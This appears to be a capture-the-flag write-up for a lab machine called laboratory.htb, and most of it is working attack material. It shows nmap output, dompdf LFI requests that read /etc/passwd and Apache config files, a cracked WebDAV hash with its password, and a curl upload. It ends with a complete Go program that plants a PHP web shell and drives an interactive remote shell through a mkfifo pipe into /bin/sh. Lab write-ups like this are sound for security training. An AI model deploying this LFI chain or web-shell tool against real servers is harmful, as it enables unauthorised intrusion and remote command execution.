#linux #lfi #dompdf

```shell
nmap -sC -sV -oN nmap/lab $IP -Pn -p- --min-rate=1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 07:05 CST
Nmap scan report for 10.129.238.212
Host is up (0.017s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_http-title: The Laboratory
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.33 seconds

```


# I used gobuster to enumerate the site, found a library file named "dompdf", which has LFI vulnerability [CVE-2014-2383](https://www.exploit-db.com/exploits/33004) 

```
GET /dompdf/dompdf.php?input_file=php://filter/read/resource=/etc/passwd
```

# Enumerated apache configuration files, found webdav credentials path, Used john to crack the password

```shell
GET /dompdf/dompdf.php?input_file=php://filter/read/resource=/etc/apache2/sites-enabled/000-default.conf

/var/www/html/webdav_test_inception/webdav.passwd

webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0

babygurl69
```


# Tried uploading files on webdav [resource](https://stackoverflow.com/questions/1205101/command-line-utility-for-webdav-upload)

```
curl -T <file> <ip/webdav_test_inception> -u webdav_tester:babygurl69
```

# Created a go lang script that would forward the response from the web to create pseudo terminal

```go
package main

import (
    "time"
    "math/rand"
    "fmt"
    "net/http"
    "os"
    "io"
    "bufio"
    "strings"
    "strconv"
)

func fetch_command(file *os.File ,method string,cmd string ) string{
    eurl := "http://10.129.240.19/webdav_test_inception"
    username :="webdav_tester"
    password := "babygurl69"
    var fileBody io.Reader
    if method != "GET" {
        fileBody = file
    }   
    cmd = strings.ReplaceAll(cmd," ","+")
    fmt.Println(cmd)
    req,err := http.NewRequest(method,eurl+"/shell.php?cmd="+cmd,fileBody)
    req.SetBasicAuth(username,password)
    client := &http.Client{
       Timeout: 1 * time.Second,
    }
    resp,err := client.Do(req)
    
    if err != nil {
        fmt.Printf("write req error: %w",err)
    }
    body, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Printf("body error: %w",err)
    }

    defer resp.Body.Close()
    return string(body)
    

}

func main(){
    payload := "<?php system($_GET['cmd'])?>"
    randId:= rand.Intn(1000)
    input := "/dev/shm/inp."+strconv.Itoa(randId)
    output:= "/dev/shm/out."+strconv.Itoa(randId)
    err := os.WriteFile("shell.php", []byte(payload), 0755)
    if err != nil {
        fmt.Printf("write error: %w",err)
    }
    file,err := os.Open("shell.php")
    if err != nil {
        fmt.Printf("write error: %w",err)
    }
    defer file.Close()
    
    resp := fetch_command(file,"PUT","")  
    fetch_command(nil,"GET",fmt.Sprintf("mkfifo %s",input))
    fetch_command(nil,"GET",fmt.Sprintf("tail -f %s | /bin/sh 2>&1 > %s",input,output))
    fmt.Println(resp)
    for true{
        fmt.Print("$shell> ")

        reader := bufio.NewReader(os.Stdin)
        cmd,_ := reader.ReadString('\n')
        cmd = strings.Replace(cmd, "\n", "", -1)
        cmd = fmt.Sprintf("echo \"%s\" > %s",cmd,input)
        fmt.Println(cmd)
        fetch_command(nil,"GET",cmd)
        resp := fetch_command(nil,"GET",fmt.Sprintf("cat %s",output))
        fmt.Println(resp)
        if cmd =="end"{
            fmt.Println("You will pay for this!!!")
            break
        }
    }
}



```